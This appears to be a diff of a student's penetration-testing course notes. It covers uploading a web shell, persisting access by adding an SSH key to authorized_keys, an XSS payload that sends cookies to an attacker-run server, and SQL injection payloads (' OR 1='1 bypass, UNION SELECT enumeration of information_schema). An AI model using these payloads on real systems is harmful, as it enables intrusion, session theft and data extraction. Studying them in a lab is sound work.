@@ -131,7 +131,6 @@ robots.txt
 /uploads
 Nikto:
 nikto v -h 10.50.28.11
-Same as robots.txt
 
 /uploads has thingy.php that provides a shell 
 Main page allows file upload; uploaded web shell to server. File name is /uploads/thingy.php
@@ -140,7 +139,7 @@ ssh-keygen to create public-private key pair
 
 echo "<key>" >> /var/www/.ssh/authorized_keys
 
-
+ssh -i .ssh/id_rsa -MS /tmp/web billybob@127.0.0.1 -p 2121
 
 
 
@@ -152,9 +151,122 @@ base for grabbing a cookie:
 
 python3 -m http.server
 <script>document.location="http://<`ip:port`>/?" + document.cookie;</script>
+##################################################################################################################################################################################
+---------------------------------------------------------------------------------SQL INJECTION------------------------------------------------------------------------------------
+##################################################################################################################################################################################
+SELECT    -    Extracts data from a database
+
+UNION    -    Used to combine the result-set of two or more SELECT statements
+
+USE    -    Selects the DB to use
+
+UPDATE    -    Updates data in a database
+
+DELETE    -    Deletes data from a database
+
+INSERT INTO    -    Inserts new data into a database
+
+CREATE DATABASE    -    Creates a new database
+
+ALTER DATABASE    -    Modifies a database
+
+CREATE TABLE    -    Creates a new table
+
+ALTER TABLE    -    Modifies a table
+
+DROP TABLE
+	
+
+Deletes a table
+
+CREATE INDEX
+	
+
+Creates an index (search key)
+
+DROP INDEX
+	
+
+Deletes an index
+
+To gain access to an SQL database within a server, type:
+mysql
+
+show SQL Databases:
+    Show databases ;
+
+default databases:
+    - inforation_schema
+    - mysql
+    - performance_schema
+
+to switch Databases:
+    use <DB NAME> ;
+
+see the column named 'columns' from the table named 'columns':
+    show columns from columns
+
+grabs nested items within the table `columns` from the database `information_schema`:
+    select table_schema,table_name,column_name from information_schema.columns ;
+SYNTAX:                                             database^ table viewed^
+    select <information bank> from <database> . <table> ;
+
+Change a session:
+    use <database> ;
+
+shows what tables are in a database:
+    show tables from <database> ;
+
+DESCRIPTION:
+    select username,passwd,studentID from session.userinfo ;
+
+    select name,cost,color,from session.car
+    select name,size,cost from session.Tires
+--------------------------------------------------------------------------------------------------------------------------------------
+DEMO
+
+Input THIS EXACT truth statement into login and password field:
+' OR 1='1
+Go to Network tab and log in
+add ? to end of URL. Copy&paste raw string from POST request against it
+This will bring you to a page with (for this course) credentials
+
+Test fields to see what is vulnerable:
+Do 'fuzzing'. Just kinda mess around a bit
+one or more of a field may be misconfigured
+<field>' OR 1='1
+
+Identify number of columns
+Audi' UNION SELECT 1,2,3,4,5 #
+
+Audi 'UNION SELECT table_schema, 2, table_name, column_name, 5 from information_schema.columns #
+[Audi 'UNION SELECT table_schema, table_name, 3, column_name, 5 from information_schema.columns #]
+
+find other DB & modify golden statment as fit:
+Audi 'UNION SELECT type,2,cost,color,year from session.car #
+
+Audi 'UNION SELECT carid,2,type,name,year from session.car #
+
+Databases:
+session
+    Tables: Tires
+        Column names: Tireid
+                      Name
+                      size
+                      cost
+            Car
 
 
 
+
+
+
+
+
+
+
+
+                                                        
 
 
 
